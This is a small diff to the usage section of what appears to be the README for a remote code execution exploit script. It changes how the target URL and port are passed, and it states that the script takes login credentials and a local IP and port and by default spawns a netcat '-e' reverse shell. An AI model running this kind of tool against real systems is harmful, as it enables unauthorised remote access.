@@ -17,7 +17,7 @@ pip3 install requests
 Use:
 
 ```
-python3 rce_script.py -u <username> -p <password> -g <url without port> -l <local ip> -P <local port> [<shell lang>]
+python3 rce_script.py -u <username> -p <password> -g <url:port> -l <local ip> -P <local port> [<shell lang>]
 ```
 
 By default, the netcat with -e option shell is used.
